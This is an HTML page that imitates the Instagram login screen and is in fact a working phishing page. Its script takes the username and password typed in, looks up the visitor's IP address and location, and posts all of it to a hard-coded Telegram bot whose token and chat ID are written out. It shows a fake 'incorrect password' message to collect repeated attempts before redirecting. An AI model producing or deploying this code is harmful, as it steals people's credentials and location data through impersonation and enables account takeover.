<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- Favicon -->
    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" type="image/svg+xml">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        /* General Styling */
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: white;
            width: 350px;
            padding: 40px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
            border-radius: 8px;
        }

        .logo img {
            max-width: 150px;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            color: #333;
        }

        .form-group input:focus {
            border-color: #3897f0;
            outline: none;
        }

        .btn-login {
            background-color: #3897f0;
            color: white;
            padding: 12px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            border: none;
            margin-top: 20px;
        }

        .btn-login:hover {
            background-color: #1e80d0;
        }

        .forgot-password {
            color: #3897f0;
            font-size: 14px;
            margin-top: 10px;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .signup-link {
            margin-top: 15px;
        }

        .signup-link a {
            color: #3897f0;
            text-decoration: none;
        }

        .footer {
            font-size: 12px;
            color: #8e8e8e;
            margin-top: 25px;
        }

        .footer a {
            color: #3897f0;
            text-decoration: none;
            margin: 0 5px;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Logo -->
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo">
    </div>

    <!-- Login Form -->
    <form id="contactForm">
        <!-- Username Field -->
        <div class="form-group">
            <input type="text" name="username" id="username" placeholder="Phone number, username or email" required>
        </div>

        <!-- Password Field -->
        <div class="form-group">
            <input type="password" name="password" id="password" placeholder="Password" required>
        </div>

        <!-- Login Button -->
        <button class="btn-login" type="submit">Log In</button>
    </form>

    <!-- Forgot Password Link -->
    <a href="#" class="forgot-password">Forgot password?</a>

    <!-- Sign Up Link -->
    <div class="signup-link">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <!-- Footer Links -->
    <div class="footer">
        <p>Â© 2024 Instagram from Meta</p>
        <p><a href="#">About</a> | <a href="#">Privacy</a> | <a href="#">Terms</a></p>
    </div>
</div>

<script>
    let attemptCount = 0;

    // Function to toggle password visibility
    function togglePassword() {
        var passwordInput = document.getElementById("password");
        var showButton = passwordInput.nextElementSibling;
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            showButton.textContent = "Hide";
        } else {
            passwordInput.type = "password";
            showButton.textContent = "Show";
        }
    }

    // Function to fetch user's IP info for geo-location
    async function fetchGeoInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (response.ok) {
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    state: data.region
                };
            } else {
                throw new Error('Failed to fetch IP information');
            }
        } catch (error) {
            console.error(error);
            return null;
        }
    }

    // Handle login attempt
    async function handleLogin(event) {
        event.preventDefault();
        attemptCount++;

        const form = document.getElementById("contactForm");

        // Fetch geolocation info
        const geoInfo = await fetchGeoInfo();
        if (!geoInfo) {
            alert("Failed to fetch IP information. Please try again.");
            return;
        }

        // Prepare login attempt details
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const { ip, country, state } = geoInfo;
        const app = 'Instagram';
        const textMessage = `*New login attempt:* \n*Username:* ${username}\n*Password:* ${password}\n*IP Address:* ${ip}\n*Country:* ${country}\n*State:* ${state}\n*App:* ${app}\n*Attempt:* Attempt ${attemptCount}`;

        // Telegram bot details
        const chatId = '7735490302'; // Replace with your actual chat ID
        const token = '7769927746:AAGY_cQOjnRPs7_x4ooXr90qFSe9LnBvr20'; // Replace with your actual bot token

        // Send the message to Telegram
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;

        // Send the message using fetch
        fetch(url, {
            method: "POST"
        }).then(response => response.json()).then(data => {
            if (data.ok) {
                console.log('Message sent successfully!');
            } else {
                console.log('Failed to send message.');
            }
        }).catch(error => {
            console.error('Error:', error);
            console.log('Error sending message.');
        });

        // Handle number of attempts
        if (attemptCount >= 3) {
            window.location.href = "flock.html"; // Redirect after 3 attempts
        } else {
            alert("Incorrect password. Try again.");
        }

        // Hide the error message when the user starts typing again
        document.getElementById("username").addEventListener("input", () => alert(''));
        document.getElementById("password").addEventListener("input", () => alert(''));
    }

    // Add event listener to form submit
    document.getElementById("contactForm").addEventListener("submit", handleLogin);
</script>

</body>
</html>
